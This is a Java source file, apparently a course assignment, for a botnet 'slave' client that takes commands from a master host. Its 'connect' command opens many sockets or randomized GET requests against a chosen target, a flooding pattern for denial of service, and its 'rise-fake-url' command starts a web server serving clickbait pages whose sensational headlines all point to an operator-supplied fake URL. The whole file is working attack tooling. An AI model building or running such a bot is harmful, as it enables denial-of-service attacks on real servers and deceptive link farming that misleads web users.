package prbot;


import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Created by chvijaydravid on 25/11/2017.
 */
public class SlaveBot extends Thread {

    private AsynchronousSocketChannel soc;
    private List<ClientConnection> connectList;
    private Map<Integer, WebServer> webServerMap;
    private String myHost;
    private int myPort;

    public SlaveBot(String masterHost, int masterPort) throws IOException, ExecutionException, InterruptedException {
        soc = AsynchronousSocketChannel.open();
        soc.connect(new InetSocketAddress(masterHost, masterPort)).get();
        System.out.println("I bind to address: " + soc.getLocalAddress());
        System.out.println("I'm about to connect to master at " + soc.getRemoteAddress());
        connectList = new ArrayList<>();
        String[] split = parseAddress(soc.getLocalAddress());
        this.myHost = split[0];
        this.myPort = Integer.parseInt(split[1]);
        webServerMap = new HashMap<>();
    }

    public SlaveBot(String masterHost, int masterPort, String host, int port) throws IOException, ExecutionException, InterruptedException {
        soc = AsynchronousSocketChannel.open();
        soc.bind(new InetSocketAddress(host, port));
        System.out.println("I bind to address: " + soc.getLocalAddress());
        soc.connect(new InetSocketAddress(masterHost, masterPort)).get();
        System.out.println("I'm about to connect to master at " + soc.getRemoteAddress());
        connectList = new ArrayList<>();
        this.myHost = host;
        this.myPort = port;
        webServerMap = new HashMap<>();
    }

    public void close() {
        try {
            System.out.println("I want to be independent, I declare free against my master");
            soc.shutdownInput();
            soc.shutdownOutput();
            soc.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() {
        try {
            readRequest();
        } catch (Exception ex) {
            ex.printStackTrace();
        } finally {
            close();
        }
    }

    private void readRequest() throws InterruptedException {
        ByteBuffer bbuf = ByteBuffer.allocateDirect(2048);
        byte[] bb = new byte[2048];
        int le = -1;
        while (true) {
            try {
                le = soc.read(bbuf).get();
                if (le != -1) {
                    bbuf.flip();
                    bbuf.get(bb, 0, le);
                    String message = new String(bb, 0, le).trim();
                    System.out.println("'" + message + "'");
                    bbuf.clear();
                    //Take master's action
                    String[] command = message.split(" ");
                    if ("connect".equals(command[0])) connectCommand(command);
                    else if ("disconnect".equals(command[0])) disconnectCommand(command);
                    else if ("rise-fake-url".equals(command[0])) raiseFakeUrl(command);
                    else if ("down-fake-url".equals(command[0])) downFakeUrl(command);
                }
            } catch (Exception ex) {
                System.err.println("Unknown error happened, error: " + ex.getMessage());
                ex.printStackTrace();
            }
        }
    }

    private void raiseFakeUrl(String[] commands) {
        if (commands.length < 3) System.err.println("Incorrect rise-fake-url command");
        else {
            try {
                String address = myHost;
                int port = Integer.parseInt(commands[1]);
                String fakeUrl = commands[2];
                if (webServerMap.containsKey(port)) {
                    System.err.println("This webserver already exists at port " + port);
                    return;
                }
                WebServer webServer = new WebServer(address, port, fakeUrl);
                webServer.start();
                webServerMap.put(port, webServer);
            } catch (Exception ex) {
                System.err.println("Unknown error happened, error: " + ex.getMessage());
                ex.printStackTrace();
            }
        }
    }

    private void downFakeUrl(String[] commands) {
        if (commands.length < 2) System.err.println("Incorrect down-fake-url command");
        else {
            try {
                int port = Integer.parseInt(commands[1]);
                WebServer webServer = webServerMap.get(port);
                if (null == webServer) {
                    System.out.println("I don't behave as a web-server at port " + port);
                    return;
                }
                System.out.println("I'm about to down webserver @ " + webServer.host +
                        ":" + webServer.port + " with fake-url: " + webServer.fakeUrl);
                webServer.close();
            } catch (Exception ex) {
                System.err.println("Unknown error happened, error: " + ex.getMessage());
                ex.printStackTrace();
            }
        }
    }

    private void disconnectCommand(String[] commands) {
        if (commands.length < 2) System.err.println("Incorrect disconnect command");
        else {
            boolean found = true;
            int targetPort = commands.length == 3 ? Integer.parseInt(commands[2]) : -1;
            for (int i = 0; i < connectList.size(); i++) {
                try {
                    ClientConnection clientConnection = connectList.get(i);
                    if (clientConnection.hostName.equals(commands[1]) &&
                            (targetPort == -1 || targetPort == clientConnection.hostPort)) {
                        clientConnection.hostSocket.close();
                        System.out.println("Removing client: " + clientConnection.toString());
                        connectList.remove(i);
                        found = true;
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            if (!found) System.err.println("Incorrect host address or port in disconnect!!");
        }
    }

    private void connectCommand(String[] commands) {
        if (commands.length < 4) System.err.println("Incorrect connect command");
        else {
            String targetHost = commands[1];
            int targetPort = Integer.parseInt(commands[2]);
            int numConnection = Integer.parseInt(commands[3]);
            String commandWork = (commands.length > 4) ? commands[4] : "";
            for (int i = 0; i < numConnection; i++) {
                try {
                    ClientConnection cliConn = new ClientConnection();
                    Socket socket = new Socket(targetHost, targetPort);
                    if (commandWork.equals("keepalive")) {
                        socket.setKeepAlive(true);
                    } else if (commandWork.matches("^url=[^ ]+$")) {
                        String URL = targetHost + ":" + targetPort + commandWork.substring(4) +
                                createRandomCode(10, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
                        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF8"));
                        writer.write("GET " + URL + "\r\n");
                        writer.write("\r\n");
                        writer.flush();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        String responseLine;
                        if ((responseLine = reader.readLine()) != null) {
                            System.out.println("I got the response and here is the first line: " + responseLine);
                        }
                        System.out.println("Connected To: " + URL);
                        cliConn.hostSocket = socket;
                        cliConn.hostName = targetHost;
                        cliConn.hostPort = targetPort;
                        cliConn.connectedTime = System.currentTimeMillis();
                        System.out.println("Connect to " + targetHost + ":" + targetPort + " successful.");
                        connectList.add(cliConn);
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }

    }


    public static void main(String[] args) {
        String masterHost = "127.0.0.1", slaveHost = null;
        int masterPort = 8777, slavePort = -1;
        for (int i = 0; i < args.length; i += 2) {
            if ("-sh".equals(args[i]) || "--slave-host".equals(args[i])) {
                slaveHost = args[i + 1];
            } else if ("-sp".equals(args[i]) || "--slave-port".equals(args[i])) {
                slavePort = Integer.parseInt(args[i + 1]);
            } else if ("-h".equals(args[i]) || "--host".equals(args[i])) {
                masterHost = args[i + 1];
            } else if ("-p".equals(args[i]) || "--port".equals(args[i])) {
                masterPort = Integer.parseInt(args[i + 1]);
            }
        }
        SlaveBot slaveBot = null;
        try {
            if (slaveHost == null || slavePort == -1) {
                slaveBot = new SlaveBot(masterHost, masterPort);
            } else {
                slaveBot = new SlaveBot(masterHost, masterPort, slaveHost, slavePort);
            }
            slaveBot.start();
        } catch (Exception ex) {
            System.err.println("Could not connect to master, error: " + ex.getMessage());
        }
        String command = null;
        Scanner sc = new Scanner(System.in);
        while (true) {
            System.out.println(">");
            command = sc.nextLine();
            if ("quit".equalsIgnoreCase(command) || "q".equalsIgnoreCase(command)) {
                slaveBot.close();
                System.exit(0);
            }
        }
    }


    class ClientConnection {
        long connectedTime;
        String hostName;
        int hostPort;
        Socket hostSocket;

        @Override
        public String toString() {
            return "ClientConnection{" +
                    "hostName='" + hostName + '\'' +
                    ", hostPort=" + hostPort +
                    '}';
        }
    }

    private static String[] parseAddress(SocketAddress address) {
        String addressStr = address.toString();
        if (addressStr.startsWith("/")) addressStr = addressStr.replace("/", "");
        String[] tmp = addressStr.split(":");
        return tmp;
    }

    private static String getHashAddress(String host, int port) {
        return host + ":" + port;
    }

    private static String createRandomCode(int codeLength, String id) {
        Random random = new SecureRandom();
        char[] chars = id.toCharArray();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < codeLength; i++) {
            char c = chars[random.nextInt(chars.length)];
            sb.append(c);
        }
        return sb.toString();
    }
}

class WebServer extends Thread {

    private final ServerSocket webServer;
    final String host;
    final int port;
    final String fakeUrl;
    private AtomicBoolean run = new AtomicBoolean(true);

    //"http://everythingfromhere.isfake/this-is-an-assigment.html"
    public WebServer(String host, int port, String fakeUrl) throws IOException {
        this.webServer = new ServerSocket(port, 100, InetAddress.getByName(host));
        System.out.println("Started web-server at " + host + ":" + port + " contains fake-url: " + fakeUrl);
        this.host = host;
        this.port = port;
        this.fakeUrl = fakeUrl;
    }

    public void close() throws IOException, InterruptedException {
        run.set(false);
        Thread.sleep(500);
        webServer.close();
    }

    @Override
    public void run() {
        System.out.println("Waiting for connection");
        while (run.get()) {
            try {
                // wait for a connection
                Socket client = webServer.accept();
                // remote is now the connected socket
                System.out.println("Connection, sending data.");
                PrintWriter out = new PrintWriter(client.getOutputStream());
                BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
                Map<String, String> requestHeaders = getRequestHeaders(in);
                String hostContext = hostConext(host, port);
                String requestPath = requestHeaders.get("Path").replaceAll(hostContext, "");
                requestController(out, hostContext, requestPath, fakeUrl);
                out.flush();
                client.close();
            } catch (Exception e) {
                if (run.get()) { //Only throw exception when webserver is running, otherwise it no need to print out
                    System.err.println("Error: " + e);
                    e.printStackTrace();
                }
            }
        }
    }

    private static void requestController(PrintWriter out, String hostContext, String requestPath, String fakeUrl) {
        out.print(buildResponseHeader());
        out.print(headerPage());
        if ("/".equals(requestPath) || "".equals(requestPath)) out.print(mainBodyPage(hostContext));
        else if ("/apple-failed.html".equals(requestPath)) out.println(appleFailedBodyPage(fakeUrl));
        else if ("/google-failed.html".equals(requestPath)) out.println(googleFailedBodyPage(fakeUrl));
        else out.println("404");
    }

    private static String appleFailedBodyPage(String fakeUrl) {
        String rs = "<body>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Most people lost for this simple question - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! People should not do this because it's harmful - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Be careful with your doctors said - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! After see this, you won't believe in government anymore - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Why you are still poor? This is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop using your phone, you're observed by deepweb - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! You are not ugly, you are awesome! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Earth will be destroyed in 100 years - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop watching porn, here is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop masturbating, here is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "</body>" +
                "</html>";
        return rs.replaceAll("\\$\\{fakeUrl\\}", fakeUrl);
    }

    private static String googleFailedBodyPage(String fakeUrl) {
        String rs = "<body>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Most people lost for this simple question - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! People should not do this because it's harmful - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Be careful with your doctors said - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! After see this, you won't believe in government anymore - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Why you are still poor? This is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop using your phone, you're observed by deepweb - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! You are not ugly, you are awesome! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Earth will be destroyed in 100 years - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop watching porn, here is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "<h1><a href=\"${fakeUrl}\">Check this out! Stop masturbating, here is why! - 960ed2db5f3c22aa843dacf664c2c58c</a></h1>" +
                "</body>" +
                "</html>";
        return rs.replaceAll("\\$\\{fakeUrl\\}", fakeUrl);
    }

    private static String mainBodyPage(String hostContext) {
        String rs = "<body><ul>" +
                "<li><h1><a href=\"${hostContext}/apple-failed.html\">Apple is madness</a></h1></li>" +
                "<li><h1><a href=\"${hostContext}/google-failed.html\">Google is painful</a></h1></li>" +
//                "<h1><a href=\"${hostContext}/facebook-failed.html\">Facebook is doom</a></h1>" +
//                "<h1><a href=\"${hostContext}/amazon-failed.html\">Amazon is over</a></h1>" +
//                "<h1><a href=\"${hostContext}/alibaba-failed.html\">Alibaba is crazy</a></h1>" +
                "</ul></body>" +
                "</html>";
        return rs.replaceAll("\\$\\{hostContext\\}", hostContext);
    }

    private static String hostConext(String host, int port) {
        return "http://" + host + ":" + port;
    }

    private static String headerPage() {
        return "<html>" +
                "<head>" +
                "<title>Check this out</title>" +
                "</head>";
    }

    private static String buildResponseHeader() {
        return "HTTP/1.0 200 OK\r\n" +
                "Content-Type: text/html\r\n" +
                "\r\n";
    }

    private static Map<String, String> getRequestHeaders(BufferedReader in) throws IOException {
        String str = null;
        Map<String, String> result = new HashMap();
        boolean firstLine = true;
        while ((str = in.readLine()) != null && !str.equals("")) {
            String[] split = null;
            if (firstLine) {
                split = str.split(" ");
                result.put("Method", split[0]);
                result.put("Path", split[1]);
                result.put("Protocol", split[2]);
                firstLine = false;
            } else {
                split = str.split(": ");
                result.put(split[0], split[1]);
            }
        }
        return result;
    }
}
